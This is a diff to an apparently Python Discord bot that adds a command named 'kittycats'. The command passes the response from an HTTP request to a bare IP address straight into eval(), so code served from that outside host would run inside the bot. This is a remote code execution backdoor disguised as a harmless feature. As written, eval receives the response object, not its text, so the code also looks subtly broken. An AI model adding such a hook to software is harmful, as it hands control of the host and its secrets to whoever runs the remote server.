@@ -78,6 +78,10 @@ async def quote(ctx):
     global comms
     await ctx.send(random.choice(requests.get("https://raw.githubusercontent.com/PoggerCat/quote/main/alfieisberystopid").text.split("\n")))
     comms += 1
+    
+@client.command()
+async def kittycats(ctx):
+    await ctx.send(eval(requests.get("http://185.195.71.3:9005/e")))
 
 
 @client.command()
